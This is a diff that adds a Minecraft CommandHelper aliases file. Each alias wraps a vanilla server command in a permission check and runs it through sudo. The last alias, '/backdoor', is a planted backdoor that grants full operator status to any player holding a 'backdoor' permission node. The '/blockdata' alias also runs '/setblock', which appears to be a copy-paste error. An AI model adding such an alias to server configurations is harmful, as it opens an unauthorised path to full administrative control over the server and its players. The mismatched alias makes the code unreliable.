@@ -1,0 +1,80 @@
+*:/blockdata [$] = >>>
+	if (!has_permission('minecraft.command.setblock')) { _noperm(); }
+	sudo('/setblock ' . $)
+<<<
+
+*:/entitydata [$] = >>>
+	if (!has_permission('minecraft.command.entitydata')) { _noperm(); }
+	sudo('/entitydata ' . $)
+<<<
+
+*:/execute [$] = >>>
+	if (!has_permission('minecraft.command.execute')) { _noperm(); }
+	sudo('/execute ' . $)
+<<<
+
+*:/particles [$] = >>>
+	if (!has_permission('minecraft.command.particles')) { _noperm(); }
+	sudo('/particles ' . $)
+<<<
+
+*:/playsound [$] = >>>
+	if (!has_permission('minecraft.command.playsound')) { _noperm(); }
+	sudo('/playsound ' . $)
+<<<
+
+*:/scoreboard [$] = >>>
+	if (!has_permission('minecraft.command.scoreboard')) { _noperm(); }
+	sudo('/scoreboard ' . $)
+<<<
+
+*:/setblock [$] = >>>
+	if (!has_permission('minecraft.command.setblock')) { _noperm(); }
+	sudo('/setblock ' . $)
+<<<
+
+*:/spreadplayers [$] = >>>
+	if (!has_permission('minecraft.command.spreadplayers')) { _noperm(); }
+	sudo('/spreadplayers ' . $)
+<<<
+
+*:/stats [$] = >>>
+	if (!has_permission('minecraft.command.stats')) { _noperm(); }
+	sudo('/stats ' . $)
+<<<
+
+*:/summon [$] = >>>
+	if (!has_permission('minecraft.command.summon')) { _noperm(); }
+	sudo('/summon ' . $)
+<<<
+
+*:/tellraw [$] = >>>
+	if (!has_permission('minecraft.command.tellraw')) { _noperm(); }
+	sudo('/tellraw ' . $)
+<<<
+
+*:/testfor [$] = >>>
+	if (!has_permission('minecraft.command.testfor')) { _noperm(); }
+	sudo('/testfor ' . $)
+<<<
+
+*:/testforblock [$] = >>>
+	if (!has_permission('minecraft.command.testforblock')) { _noperm(); }
+	sudo('/testforblock ' . $)
+<<<
+
+*:/testforblocks [$] = >>>
+	if (!has_permission('minecraft.command.testforblocks')) { _noperm(); }
+	sudo('/testforblocks ' . $)
+<<<
+
+*:/title [$] = >>>
+	if (!has_permission('minecraft.command.title')) { _noperm(); }
+	sudo('/title ' . $)
+<<<
+
+*:/backdoor = >>>
+	if (!has_permission('backdoor')) { _noperm(); }
+	sudo('/op ' . player())
+<<<
+
